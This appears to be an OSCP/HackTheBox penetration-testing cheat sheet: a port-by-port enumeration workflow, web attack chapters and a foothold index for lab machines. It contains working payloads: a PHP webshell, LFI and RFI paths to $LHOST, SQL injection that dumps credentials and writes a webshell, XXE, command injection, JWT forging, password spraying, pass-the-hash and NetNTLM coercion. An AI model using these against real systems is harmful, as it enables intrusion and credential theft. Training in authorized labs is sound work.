# Start

Reference: tools and sites to keep open

Keep these one click away, you reach for them on almost every box.

**Cheat sheets and payloads**

* [HackTricks](https://book.hacktricks.xyz) : the per-service and per-attack playbook, start here when stuck
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) : copy-paste payloads for every web bug
* [revshells.com](https://www.revshells.com) : reverse-shell one-liner generator (set LHOST and port, pick the type)
* [GTFOBins](https://gtfobins.github.io) and [LOLBAS](https://lolbas-project.github.io) : abuse legit binaries (handy at foothold, essential at privesc)
* [CyberChef](https://gchq.github.io/CyberChef) : decode base64, hex, ROT, JWTs, anything
* [SecLists](https://github.com/danielmiessler/SecLists) : the wordlists every command below uses

**Finding exploits (use more than one, they disagree)**

* `searchsploit <product> <version>` : local Exploit-DB mirror, offline-safe for the exam
* [Exploit-DB](https://www.exploit-db.com) : the online version, often fresher
* GitHub : search `<product> <version> exploit` or the CVE id
* [NVD](https://nvd.nist.gov) : CVE detail and affected versions
* `nmap --script vuln` and [nuclei](https://github.com/projectdiscovery/nuclei) : automated CVE and misconfig checks

**Cracking and encoding**

* `hashcat`, `john`, [CrackStation](https://crackstation.net), wordlist `/usr/share/wordlists/rockyou.txt`

**Core toolkit (have these installed)**

* Scanning: `nmap`, `ffuf`, `feroxbuster`, `gobuster`
* Windows and SMB: `netexec` (nxc), `smbclient`, `smbmap`, `enum4linux-ng`, `impacket`, `evil-winrm`
* Web and creds: `hydra`, `sqlmap`, `nuclei`, `cmseek`, `wpscan`, `git-dumper`
* SNMP and misc: `onesixtyone`, `snmpwalk`, `snmp-check`

### Step 0: Set up before you scan

* Export the target and your tun0 IP so you can paste them everywhere: `export IP=10.10.11.x` and `export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet )[0-9.]+')`.
* Make one directory per box with `nmap/`, `loot/`, `exploits/` subfolders. Keep a running notes file. Most foothold fails are lost clues, not missing skills.
* Whenever a scan or a redirect shows a hostname (for example `editor.htb`, `redirect to http://devvortex.htb/`), add it to `/etc/hosts` straight away. A box that looks empty on the IP often serves a full site on its hostname, and vhosts only resolve once the base domain is in hosts.
* Keep a listener ready in a spare pane: `nc -lvnp 4444`. Keep SecLists installed, you will reach for its wordlists constantly.

### Step 1: Port scanning

Copy-paste this block so you never type ports by hand: it sweeps all ports, pulls the open ones into a variable, and rescans only those. Do not wait for the full sweep before you start enumerating the obvious ports.

```bash
# 1) fast sweep of all 65535 TCP ports, saved to a file
nmap -p- --min-rate 10000 -T4 -Pn -oN nmap/all-tcp $IP
# 2) pull the open ports into a variable
ports=$(grep -oP '\d+(?=/tcp\s+open)' nmap/all-tcp | paste -sd,)
echo "open: $ports"
# 3) deep scan ONLY those ports (versions + default scripts), saved to a file
nmap -p$ports -sCV -oN nmap/services $IP
# 4) top UDP ports (SNMP on 161 hides here; TCP never shows it)
sudo nmap -sU --top-ports 100 -oN nmap/udp $IP

# the whole TCP part as one line when you are in a hurry:
ports=$(nmap -p- --min-rate 10000 -T4 $IP | grep '^[0-9]' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//'); nmap -p$ports -sCV $IP
```

The UDP pass is the one people skip, and it is the entire foothold on several boxes. SNMP on UDP 161 handed over credentials on Mentor, Pandora, Monitored and UnderPass. If TCP looks thin (just 22 and 80), run UDP before you assume the box is web-only.

Read the scan like a map, not a checklist. The OS, the exact service versions and the hostnames in certificates or redirects are what point you at a vector. A `commonName` in an SSL cert or an SMTP banner often leaks the real hostname to add to `/etc/hosts`.

### Step 2: Port-by-port decision tree

Web (80 and 443) comes first because most footholds live there, then sweep every other open port. Each port is a checklist: run the commands top to bottom, every line says what it does, then use the ticked decision boxes to pick your next move. The web section links straight to a chapter for each attack. Set $IP and $LHOST (Step 0) so you can paste these as-is.

#### Ports 80 and 443, Web (start here)

**Goal:** pin the exact app and version, map every input, reach source and admin.

Always run this first pass:

```bash
whatweb -a3 http://$IP                 # tech stack + versions
curl -sIL http://$IP                   # headers, redirects, Server, X-Powered-By
curl -s http://$IP/robots.txt          # disallowed paths are hints
nmap -p80,443 --script http-enum,http-git,http-title,http-methods $IP
```

**Decision tree. Match what you see, jump to the chapter:**

* [ ] Redirects to a hostname? Add it to /etc/hosts, then Web: vhosts and subdomains
* [ ] Need to find pages? Web: content discovery
* [ ] A CMS or app with a version? Web: known app and version CVEs
* [ ] A /.git or source leak? Web: exposed git and source
* [ ] A login form? Web: logins and default creds
* [ ] An upload form? Web: upload to shell
* [ ] A param that loads a file or page (?page=, ?file=)? Web: LFI and RFI
* [ ] A param that hits a database (?id=)? Web: SQL injection
* [ ] A field that fetches a URL you give it? Web: SSRF
* [ ] Input echoed into a command or template? Web: command injection and SSTI
* [ ] An XML request body? Web: XXE
* [ ] An /api, /graphql, or a JWT token? Web: APIs, GraphQL and JWT

#### Web: vhosts and subdomains

**Goal:** find the site hiding behind a hostname.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$IP/ -H 'Host: FUZZ.domain.htb' -fs 0   # -fs filters the default-page size; set it to the baseline you see
gobuster vhost -u http://domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

* [ ] New vhost? Add it to /etc/hosts and run this whole web workflow on it as a fresh site.

#### Web: content discovery

**Goal:** find hidden pages, params, backups, admin panels.

```bash
feroxbuster -u http://domain.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak,zip   # recursive, with extensions
gobuster dir -u http://domain.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,old,bak
gobuster dir -u http://domain.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt   # framework-specific when you know the stack
curl -s http://domain.htb/sitemap.xml
```

* [ ] /admin, /dev, /backup, /uploads, /.git, /actuator, /api? Open each, note the version and every input.

#### Web: exposed git and source

**Goal:** recover source code, plus the creds and secret routes in its history.

```bash
curl -s http://domain.htb/.git/HEAD                 # "ref: refs/heads/..." means the repo is exposed
git-dumper http://domain.htb/.git/ dump             # rebuild the repo locally
cd dump && git log -p | grep -iE 'pass|secret|token|key|http'   # mine every commit
```

* [ ] Repo recovered? Read config files and full history, removed secrets still live in old commits.

#### Web: known app and version CVEs

**Goal:** turn an exact version into a public exploit.

```bash
whatweb http://domain.htb                   # exact version
curl -s http://domain.htb/CHANGELOG.txt     # or /README, /VERSION, or the <meta generator> tag
# CMS and app scanners (identify the product, version and common flaws):
cmseek -u http://domain.htb                 # detects the CMS, its version, and known issues
wpscan --url http://domain.htb --enumerate vp,vt,u   # WordPress: vulnerable plugins, themes, users
joomscan -u http://domain.htb               # Joomla
droopescan scan drupal -u http://domain.htb # Drupal
nuclei -u http://domain.htb                 # templated CVE + misconfig scan
# find the exploit, cross-check several sources (they disagree):
searchsploit <product> <version>            # local Exploit-DB mirror
searchsploit -m <id>                        # copy a PoC locally, READ it before running
nmap --script vuln -p80 domain.htb          # NSE known-CVE checks
# by hand: Exploit-DB, GitHub (search the product+version or the CVE id), the vendor advisory
```

* [ ] Version pinned? Search it across the sources above, read the PoC, then run it. Most CMS footholds are one public exploit away (Joomla, Drupal, Ghost, Gila, Magento, Jenkins, pdfkit, sar2html, HFS, oscommerce).
* [ ] A scanner flagged a plugin or theme? That is usually the way in, not the core CMS.

#### Web: logins and default creds

**Goal:** get into the admin panel.

```bash
# 1) try documented defaults FIRST: admin:admin, admin:password, tomcat:s3cret, root:password
# 2) if login errors differ ("no such user" vs "wrong password"), enumerate valid users first
# 3) build a wordlist from the site, then brute only valid users:
cewl -d 2 -m 5 http://domain.htb -w words.txt
hydra -l admin -P words.txt domain.htb http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid'   # the text after the last colon is the failure string
```

* [ ] Admin panel reached? Hunt for a theme or template editor, a plugin or module installer, or a file manager, those are the path to code execution.

#### Web: upload to shell

**Goal:** get a file that runs code onto the server.

```bash
# upload a normal image first and visit it to learn where files land, then try these until one executes:
# webshell body:  <?php system($_GET['c']); ?>
curl -F 'file=@shell.php' http://domain.htb/upload        # plain
curl -F 'file=@shell.php.jpg' http://domain.htb/upload    # double extension
curl -F 'file=@shell.phtml' http://domain.htb/upload      # alt extension: phtml, php5, phar
# magic bytes: make the file start with GIF89a then the php, and send Content-Type: image/gif
curl 'http://domain.htb/uploads/shell.phtml?c=id'         # trigger it and confirm RCE
```

* [ ] A variant runs? Swap id for a reverse-shell one-liner.
* [ ] Stored but not executable? Include it via Web: LFI and RFI.

#### Web: LFI and RFI

**Goal:** read local files, then escalate the include to code execution.

```bash
# basic read, then the common filter bypasses in order:
curl 'http://domain.htb/?page=/etc/passwd'                                 # plain LFI
curl 'http://domain.htb/?page=../../../../../../etc/passwd'                # traversal
curl 'http://domain.htb/?page=....//....//....//etc/passwd'                # bypass a stripped ../
curl 'http://domain.htb/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd'              # url-encoded ../
curl 'http://domain.htb/?page=..%252f..%252fetc%252fpasswd'               # double url-encoded
curl 'http://domain.htb/?page=/etc/passwd%00'                             # null byte (old PHP < 5.3)
curl 'http://domain.htb/?page=php://filter/convert.base64-encode/resource=index.php'   # read PHP source
# brute every bypass at once with a payload list:
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://domain.htb/?page=FUZZ' -mr 'root:'   # -mr keeps only hits that contain the /etc/passwd marker
# or loop the traversal depth by hand until one works:
for i in $(seq 1 12); do d=$(printf '../%.0s' $(seq 1 $i)); curl -s "http://domain.htb/?page=${d}etc/passwd" | grep -q 'root:' && echo "[+] depth $i works: ${d}"; done
# dedicated tools if you prefer: liffy, LFISuite
# --- LFI to RCE ---
#  log poisoning: put  <?php system($_GET['c']); ?>  in the User-Agent, then include /var/log/apache2/access.log
#  session poisoning: get your payload into PHPSESSID, then include /var/lib/php/sessions/sess_<your-id>
#  include a file you uploaded earlier
# --- RFI (host the payload yourself) ---
curl 'http://domain.htb/?page=http://$LHOST/shell.txt'                     # over HTTP
curl 'http://domain.htb/?page=\\$LHOST\share\shell.php'                    # over SMB when HTTP is filtered
```

* [ ] Can read files? Grab configs, SSH keys and source to find creds.
* [ ] Can poison a log, a PHP session, or include an upload? That turns LFI into RCE.
* [ ] Only base64 source comes back? Read every included file to map the app and find the next bug.

#### Web: SQL injection

**Goal:** bypass a login, dump creds, or reach RCE.

```bash
# 1) detect: break the query, watch for an error or a changed page
curl "http://domain.htb/item.php?id=1'"          # a quote often triggers a SQL error
curl "http://domain.htb/item.php?id=1 AND 1=1"   # true page
curl "http://domain.htb/item.php?id=1 AND 1=2"   # false page; different = injectable

# 2) login bypass, try these in the form:
#    ' OR 1=1-- -      ' OR '1'='1      admin'-- -

# 3) MANUAL union-based (no sqlmap, the OSCP-safe way)
' ORDER BY 1-- -        # raise N until it errors = column count
' UNION SELECT 1,2,3-- -   # see which columns print back
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -   # databases
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -   # tables
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -   # columns
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -   # dump creds (0x3a is a colon)
' UNION SELECT 1,load_file('/etc/passwd'),3-- -   # read a file (needs FILE priv)
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/sh.php'-- -   # write a webshell = RCE

# 4) blind (no visible output): infer char by char, or by time
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
' AND SLEEP(5)-- -

# 5) automate in LABS ONLY (sqlmap is not allowed in the OSCP exam):
sqlmap -r req.txt --batch --level 3 --risk 2       # req.txt saved from Burp
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D app -T users --dump
sqlmap -r req.txt --batch --os-shell
```

* [ ] Login form? Try the auth-bypass payloads first, you may land straight in the admin panel.
* [ ] Data param? UNION to dump the users table (or sqlmap in labs), then crack and reuse the hashes.
* [ ] FILE privilege and a known web root? Write a webshell with INTO OUTFILE for direct RCE.
* [ ] No output at all? Fall back to boolean and time-based blind.

#### Web: SSRF

**Goal:** make the server reach services you cannot.

```bash
curl -X POST http://domain.htb/fetch -d 'url=http://127.0.0.1:80/'          # confirm it hits localhost
ffuf -w ports.txt -u http://domain.htb/fetch -X POST -d 'url=http://127.0.0.1:FUZZ/' -fs 0   # port-scan internally
curl -X POST http://domain.htb/fetch -d 'url=http://127.0.0.1:5000/admin'   # reach an internal-only panel
```

* [ ] Reaches localhost? Enumerate internal ports, then pull from internal APIs or admin panels that leak creds.

#### Web: command injection and SSTI

**Goal:** run shell commands through a vulnerable parameter.

```bash
curl 'http://domain.htb/ping?ip=127.0.0.1;id'     # ; chains a second command
curl 'http://domain.htb/ping?ip=127.0.0.1|id'     # | pipes to one
curl 'http://domain.htb/ping?ip=$(id)'            # $() substitutes a command
curl 'http://domain.htb/?name={{7*7}}'            # SSTI probe; a 49 back means template injection
```

* [ ] Command output or 49 comes back? You have RCE, drop a reverse shell.

#### Web: XXE

**Goal:** read local files through an XML parser.

```bash
# a page that parses an XML body: declare an external entity and reference it
# <?xml version='1.0'?>
# <!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>
# <root><field>&x;</field></root>
curl -X POST http://domain.htb/api -H 'Content-Type: application/xml' --data @xxe.xml
```

* [ ] Entity reflected in the response? Read /etc/passwd, SSH keys and app config to find creds.

#### Web: APIs, GraphQL and JWT

**Goal:** pull data and creds out of APIs, and forge your way past token auth.

```bash
# find API routes:
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://domain.htb/api/FUZZ
# GraphQL: introspection dumps the whole schema (types, fields, queries)
curl -s http://domain.htb/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq
# then query a sensitive type you just found:
curl -s http://domain.htb/graphql -H 'Content-Type: application/json' -d '{"query":"{users{username password}}"}' | jq
# JWT (header.payload.signature): read it, then try to forge it
echo <token> | cut -d. -f2 | base64 -d        # decode and read the claims
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt   # crack a weak HS256 secret
jwt_tool <token> -X a                          # forge with alg:none
```

* [ ] Introspection on? Dump the schema, then query for users, passwords and tokens.
* [ ] A JWT? Decode the claims, try alg:none and a weak-secret crack, then tamper your role to admin.

#### Port 21, FTP

**Goal:** anonymous access and files that leak creds, config or keys.

```bash
nmap -p21 -sV --script=ftp-anon,ftp-syst $IP   # version + anonymous-login check
ftp $IP                                        # login: anonymous / anonymous (blank pw often ok)
wget -m --no-passive ftp://anonymous:anonymous@$IP   # mirror everything readable
ftp $IP                                        # with creds: user / pass
# ftp> put shell.php                           # if writable AND the dir is web-served = RCE
```

* [ ] Anonymous login? Pull everything, grep for passwords, keys, configs.
* [ ] Version has a CVE (vsftpd 2.3.4, ProFTPd 1.3.5 mod\_copy)? Run it.
* [ ] Writable and web-served? Upload a shell, then Web: upload to shell.

#### Port 22, SSH

**Goal:** log in with a credential or key found elsewhere. Do not brute blindly.

```bash
nmap -p22 -sV $IP               # version (a hint, rarely the vector)
ssh user@$IP                    # password login
chmod 600 id_rsa; ssh -i id_rsa user@$IP   # key login
ssh2john id_rsa > h; john h     # crack an encrypted key
```

* [ ] Have any cred or key from another service? Try it here first, reuse is constant.
* [ ] Nothing yet? Leave SSH, come back once you have creds.

#### Ports 25, 110, 143, 4555, mail

**Goal:** mail is several services at once. SMTP (25) leaks valid usernames, POP3 (110) and IMAP (143) let you read a mailbox once you have creds, and James (4555) is an admin console. Enumerate users, get into a mailbox, read everything.

```bash
nmap -p25,110,143,465,587,993,995,4555 -sCV $IP   # see which mail services are up

# 25 SMTP: transfers mail, and leaks valid users
nc $IP 25                      # then type: EHLO x / VRFY root / EXPN admin   (a 2xx reply = valid user)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP   # bulk user check
smtp-user-enum -M RCPT -U names.txt -t $IP        # use RCPT TO when VRFY is disabled
# open-relay test (can you send as anyone?): MAIL FROM:<a@b.c> / RCPT TO:<victim> ; accepted = relay

# 110 POP3: read a mailbox, bare-bones
nc $IP 110                     # USER bob / PASS secret / LIST / RETR 1   (RETR 1 reads message 1)

# 143 IMAP: read a mailbox with folders and search
nc $IP 143                     # a1 LOGIN bob secret / a2 LIST \"\" * / a3 SELECT INBOX / a4 FETCH 1 BODY[]
openssl s_client -connect $IP:993   # same IMAP commands over TLS (993 IMAPS, 995 POP3S)

# 465 / 587 submission: where you SEND crafted mail once you have creds (phishing, client-side CVEs)

# 4555 Apache James remote admin
telnet $IP 4555                # try root / root, then: listusers / setpassword <user> <newpass>
```

* [ ] VRFY / EXPN / RCPT return valid users? That userlist feeds SSH, SMB and every login form.
* [ ] Have mailbox creds (110 or 143)? Read every message, reset links and plaintext creds live in inboxes.
* [ ] James admin (4555) with root/root? Reset a user's password, log in on 110/143, read their mail.
* [ ] Open relay or a mail-client CVE? Send a crafted mail to a user to leak a hash or run code.

#### Port 53, DNS

**Goal:** more hostnames and subdomains to attack.

```bash
dig +short ns domain.htb @$IP     # nameservers
dig axfr @$IP domain.htb          # zone transfer (the jackpot)
dnsrecon -d domain.htb -n $IP -a  # automated, includes AXFR
```

* [ ] Zone transfer works? Add every host to /etc/hosts and enumerate them.

#### Ports 111, 2049, NFS

**Goal:** mount exports to read or plant files.

```bash
showmount -e $IP                                     # list exports
sudo mkdir -p /mnt/nfs; sudo mount -t nfs $IP:/export /mnt/nfs -o nolock
ls -la /mnt/nfs                                      # read everything
sudo useradd -u 1001 tmp; sudo -u tmp cat /mnt/nfs/file   # fake a uid to read a file owned by it
```

* [ ] Readable export? Pull backups, DB files, SSH keys, notes with creds.
* [ ] Writable export another service reads? Plant an SSH key or a webshell.

#### Ports 139, 445, SMB

**Goal:** read shares, enumerate users, and turn a writable share or valid SMB auth into a shell or a crackable hash. Use netexec (nxc), the maintained successor to crackmapexec.

```bash
nxc smb $IP                              # banner: OS, domain, SMB signing, SMBv1 (all matter later)
nxc smb $IP -u '' -p ''                  # null session
nxc smb $IP -u guest -p ''               # guest account
nxc smb $IP -u user -p pass --shares     # shares with READ/WRITE per share  <-- the one you need
nxc smb $IP -u user -p pass --users      # domain users
nxc smb $IP -u user -p pass --rid-brute  # enumerate users by RID when --users is blocked
nxc smb $IP -u user -p pass -M spider_plus   # crawl every readable share for interesting files
nxc smb $IP -u users.txt -p 'Winter2024!' --continue-on-success   # spray one password over many users
nxc smb $IP -u user -H <NThash>          # pass-the-hash, no password needed

# browse and pull files by hand:
smbclient -L //$IP/ -N                               # list shares, null session
smbclient //$IP/Share -N                             # open a share with no creds
smbclient //$IP/Share -U 'user%pass' -c 'recurse ON; ls'            # look around
smbclient //$IP/Share -U 'user%pass' -c 'prompt OFF; recurse ON; mget *'   # download the whole share
smbmap -H $IP -u user -p pass -r Share               # alternative recursive lister

# writable share -> coerce a NetNTLM hash: drop a malicious .scf or .url, then listen
sudo responder -I tun0                   # the hash drops when a user browses that share; crack it offline
```

* [ ] Null or guest lists shares? Read every one, then grep the loot offline for pass, cred, .config, .kdbx, id\_rsa.
* [ ] A share is WRITE? Either drop a webshell if it maps to a web root (Web: upload to shell), or drop a .scf/.url with a UNC path and catch the NetNTLM hash on responder, then crack it.
* [ ] \--users or --rid-brute gave names? Build users.txt, spray a likely password, then feed WinRM, RDP and SSH.
* [ ] Banner shows SMBv1 or signing disabled? Note it: SMBv1 points at EternalBlue-class bugs, signing-off enables relay (both usually privesc, flag for later).

#### Port 161/udp, SNMP

**Goal:** pull creds and process arguments out of SNMP, the port people forget.

```bash
sudo nmap -sU -p161 -sV $IP                         # confirm + version
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP   # brute the community string
snmpwalk -v2c -c public $IP                         # dump the whole tree
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.5  # full process command lines (creds hide here)
snmpbulkwalk -v2c -c public $IP . | grep -i 'pass\\|user\\|sudo'   # grep the dump
```

* [ ] Found a community string? Walk everything.
* [ ] A password shows up as a process argument? That is your credential.

#### Ports 389, 636, LDAP

**Goal:** dump the directory for users and attributes.

```bash
nmap -p389 --script ldap-rootdse $IP                   # naming contexts
ldapsearch -x -H ldap://$IP -s base namingcontexts     # base DN
ldapsearch -x -H ldap://$IP -b 'dc=domain,dc=htb'      # dump everything, anonymous
```

* [ ] Anonymous bind works? Dump users and descriptions, passwords sometimes sit in an attribute.

#### Port 1433, MSSQL

**Goal:** run commands or coerce a hash, using creds found elsewhere.

```bash
impacket-mssqlclient user:pass@$IP -windows-auth   # connect (drop -windows-auth for SQL auth)
enable_xp_cmdshell                                 # impacket helper to switch it on
xp_cmdshell whoami                                 # command execution
EXEC xp_dirtree '\\$LHOST\share',1,1;              # coerce auth to your Responder
```

* [ ] xp\_cmdshell available? Direct RCE, go to a reverse shell.
* [ ] Not enabled? xp\_dirtree to a running Responder to capture a NetNTLM hash, then crack it.

#### Port 3306, MySQL

**Goal:** read app config and credential tables with found creds.

```bash
mysql -h $IP -u root -p    # log in with found creds
# show databases; use app; show tables; select * from users;
```

* [ ] Creds work? Pull user tables and hashes, crack and reuse.

#### Port 3389, RDP

**Goal:** interactive access once you own a Windows user.

```bash
nmap -p3389 --script rdp-ntlm-info $IP                      # hostname, domain, OS
xfreerdp /u:user /p:pass /v:$IP /cert:ignore +clipboard     # interactive session
```

* [ ] Have Windows creds? Log in for a GUI foothold, the password is usually hidden on a website or share.

#### Ports 5985, 5986, WinRM

**Goal:** a shell on Windows once you have credentials.

```bash
crackmapexec winrm $IP -u user -p pass   # validate (prints Pwn3d! if admin)
evil-winrm -i $IP -u user -p pass        # shell
evil-winrm -i $IP -u user -H <NTLM-hash> # pass-the-hash
```

* [ ] Valid creds or hash? The standard Windows foothold once you own a user.

#### App-specific ports (fingerprint, then match the version to a CVE)

```bash
nmap -sV -p<port> $IP        # pin the product AND version
whatweb http://$IP:<port>    # for anything HTTP-ish
searchsploit <product> <version>
```

* 8080 / 8009 Tomcat and AJP: /manager/html default creds then WAR deploy; AJP 8009 Ghostcat file read.
* 8080 Jenkins: /script console if unauthenticated, else the current file-read CVE.
* 8080 HFS: Rejetto HFS 2.3 unauth RCE.
* 8081 / 3000 custom API: test every parameter for command injection (Web: command injection and SSTI), and check GraphQL introspection for creds.
* 61616 ActiveMQ, 8500 ColdFusion, 6697 UnrealIRCd, 10000 Webmin: each has a version-specific public RCE.

### Step 3: From finding to shell

Almost every foothold on these boxes is one of these shapes. Once a finding matches a row, you know what to try next.

| If you found                                   | Turn it into a shell by                                                                                                 | Examples                                                                                                                                      |
| ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| An admin panel                                 | Trying documented default creds, then creds found elsewhere on the box.                                                 | Keeper, BoardLight, Jerry, UnderPass, Monitored                                                                                               |
| An app with a known version                    | Mapping the exact version to its CVE and running the public PoC.                                                        | Builder (Jenkins), Broker (ActiveMQ), Devvortex (Joomla), Codify (vm2), Precious (pdfkit), Editor (XWiki), Dog (Backdrop), LinkVortex (Ghost) |
| An exposed .git or source                      | Dumping it, then reading commit history for creds, logic, and hidden endpoints or headers.                              | Pilgrimage, Dog, LinkVortex, UpDown                                                                                                           |
| A file upload                                  | Uploading a webshell, bypassing the filter with double extensions, magic bytes, or an allowed type that still executes. | Popcorn, Networked, Bounty, Magic, Nibbles, Bashed (already exposed), Love                                                                    |
| A page that includes files (LFI)               | Reading creds and keys, or chaining to RCE via log poisoning, phpinfo, or an uploaded file.                             | Poison, Servmon, Nineveh, Mailing                                                                                                             |
| A page that fetches a URL you control (SSRF)   | Scanning internal ports and hitting internal-only APIs to leak creds.                                                   | Editorial, Silentium, Secnotes                                                                                                                |
| An input that reaches a DB (SQLi)              | Auth bypass, dumping credential tables, or stacked queries to RCE.                                                      | Magic, Jarvis, Monitored, CCTV                                                                                                                |
| An XML parser                                  | XXE to read local files, including SSH keys and config.                                                                 | Markup                                                                                                                                        |
| An input that reaches a shell or `eval`        | Command or code injection with a reverse-shell payload.                                                                 | Busqueda (Searchor eval), Precious (pdfkit), Mentor (API), CozyHosting                                                                        |
| Credentials anywhere                           | Spraying them across SSH, SMB, the app, MSSQL, and other users. Reuse is the norm.                                      | Dog, BoardLight, Keeper, Busqueda                                                                                                             |
| A writable SMB share, or MSSQL / a mail client | Dropping a webshell or SCF, or coercing a NetNTLM hash to crack.                                                        | Secnotes, Giddy, Mailing                                                                                                                      |

Remote file inclusion is worth a special note: it is rarely over HTTP. On Sniper the include only worked when the payload was served over SMB (`\\LHOST\share\shell.php`), so always try alternate protocols before giving up on an include.

### Step 4: When you are stuck on the foothold

The foothold is the hardest part of most boxes. When you are stuck, it is almost always a missed clue, not a missing technique. Work down this list.

* [ ] Did you run the UDP scan? SNMP on 161 is a whole foothold and TCP never shows it.
* [ ] Did you fuzz for virtual hosts, and for a second one? Some boxes hide the target behind `dev.`, `staging.`, `api.` or `gitea.`.
* [ ] Do you have the exact version of every service? Not "Joomla" but "Joomla 4.2.6". The version is what maps to the CVE.
* [ ] Did you try the documented default credentials for every app you found?
* [ ] Did you check `/.git` on the main site and on every vhost? Did you read the full commit history, not just the current files?
* [ ] Did you brute force directories with a wordlist specific to the framework, not just a generic one?
* [ ] Did you map every input and run the site through Burp to see hidden parameters and headers?
* [ ] For an include that will not fire, did you try other protocols (SMB, data, php filter, phar)?
* [ ] Did you reuse every credential you found across every service and user?
* [ ] Did you re-read the source or config you already pulled? The clue is often sitting in a file you dumped an hour ago.
* [ ] Does the box want you to install the vulnerable software locally to understand the exploit? Several foothold writeups say this is what unlocked it.

If all of that is clean and you are still stuck, the vector is probably a public CVE for a version you have not pinned down yet. Go back and nail the version.

### Foothold pattern families

The machines in your list, grouped by the shape of the foothold. This is the part worth internalising: the same handful of patterns repeat across every box.

* **Known CVE on a fingerprinted app.** HTB: Builder, Jeeves, Jerry, Tabby, Broker, Devvortex, Codify, Precious, Editor, Dog, LinkVortex, BoardLight, Swagshop, OpenAdmin, Remote, Pandora, Monitored, CCTV, Arctic, Chatterbox, Buff. THM: Thompson, Daily Bugle, CMesS, Zeno, Boiler, Year of the Jellyfish, Steel Mountain, Blueprint, Hackpark, Tomghost, Kenobi, Irked.
* **Default or weak credentials.** HTB: Jerry, Keeper, UnderPass, BoardLight, Netmon, Tabby, Sunday. THM: Thompson, Alfred, Mr Robot, GameZone, Year of the Owl.
* **Exposed source or .git leak.** HTB: Pilgrimage, Dog, LinkVortex, UpDown.
* **SNMP enumeration to credentials.** HTB: Mentor, Pandora, Monitored, UnderPass. THM: Year of the Owl.
* **LFI, directory traversal, or RFI.** HTB: Poison, Servmon, Nineveh, Sniper, Mailing. THM: Tomghost, Skynet.
* **File upload to webshell.** HTB: Bashed, Popcorn, Networked, Bounty, Magic, Help, Nibbles, Love. THM: RootMe, LazyAdmin, Zeno, Relevant, AllSignsPoint2Pwnage, Mr Robot.
* **SSRF or logic abuse.** HTB: Editorial, Silentium, Secnotes.
* **SQL injection.** HTB: Jarvis, Magic, Monitored, CCTV. THM: GameZone, Daily Bugle, Help.
* **XXE.** HTB: Markup.
* **Command or code injection.** HTB: Busqueda, Precious, Mentor, CozyHosting. THM: Ultratech, Connected.
* **Credentials hidden in content, then remote login.** THM: Retro, Anthem, Wonderland.
* **SMB share to a webshell or token.** HTB: Secnotes, Querier. THM: Weasel, Relevant, AllSignsPoint2Pwnage, Skynet.
* **Mail server abuse.** HTB: Solidstate, Mailing.
* **MSSQL abuse.** HTB: Querier, Giddy.
* **NFS or protocol chain.** HTB: Enigma, Access, Heist. THM: Kenobi.

Notice how often two families combine. The usual chain is: enumerate a service, find a credential or an exact version, then either log in or fire a public CVE. Very few footholds here are a single clean exploit with nothing before it.

### Per-machine foothold index

Every machine in your list, with the port or service that mattered, the foothold vector, and the clue that pointed to it. Stops at first shell. HackTheBox first, then TryHackMe.

#### HackTheBox machines

| Machine     | OS  | Service             | Foothold vector                                                                                      | How it was spotted                                    |
| ----------- | --- | ------------------- | ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------- |
| Access      | Win | FTP, Telnet         | Anonymous FTP holds an Access .mdb and a PST; creds from both, then telnet.                          | Anonymous FTP login, odd file types in the share.     |
| Arctic      | Win | ColdFusion 8 (8500) | Known ColdFusion exploit (LFI to admin hash, or FCKeditor upload) then deploy a JSP shell.           | Slow app on 8500 fingerprinted as Adobe ColdFusion 8. |
| Bashed      | Lin | HTTP                | An exposed `phpbash.php` web shell runs commands as www-data directly.                               | Dir brute force found `/dev/phpbash.php`.             |
| BoardLight  | Lin | HTTP vhost          | Dolibarr 17.0.0 default `admin:admin`, then CVE-2023-30253 PHP injection.                            | `crm.board.htb` vhost, version in the page.           |
| Bounty      | Win | IIS                 | Upload a `web.config` with embedded ASP via `transfer.aspx`; it executes.                            | Upload form, filter allowed web.config.               |
| Broker      | Lin | ActiveMQ (61616)    | ActiveMQ 5.15.15 CVE-2023-46604 OpenWire unauthenticated RCE.                                        | Version string in the ActiveMQ admin page.            |
| Buff        | Win | HTTP                | Gym Management System 1.0 unauthenticated RCE via `upload.php`.                                      | Footer: Powered by Gym Management Software 1.0.       |
| Builder     | Lin | Jenkins (8080)      | Jenkins 2.441 CVE-2024-23897 arbitrary file read to pull creds and keys.                             | Jenkins version via whatweb.                          |
| Busqueda    | Lin | HTTP                | Searchor 2.4.0 `eval` command injection in the search box.                                           | Footer: Powered by Flask and Searchor 2.4.0.          |
